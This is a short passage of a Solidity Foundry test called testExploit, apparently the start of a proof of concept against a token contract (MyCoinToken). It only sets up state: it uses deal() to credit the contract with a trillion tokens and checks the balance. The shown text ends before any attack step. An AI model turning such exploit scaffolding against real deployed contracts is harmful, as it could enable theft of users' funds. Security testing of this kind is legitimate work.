    function testExploit() public {
        // Get the current owner address
        address owner = MyCoinToken(TARGET).owner();

        // First, ensure the contract has some token balance from accumulated bounsFee
        // Use deal() to directly give tokens to the contract
        uint256 contractInitialBalance = 1000000000000 * 10 ** 9; // 1 trillion tokens with 9 decimals
        deal(TARGET, TARGET, contractInitialBalance);

        // Check contract balance
        uint256 contractBalanceBefore = MyCoinToken(TARGET).balanceOf(TARGET);
        require(contractBalanceBefore > 0, "Contract must have positive balance");

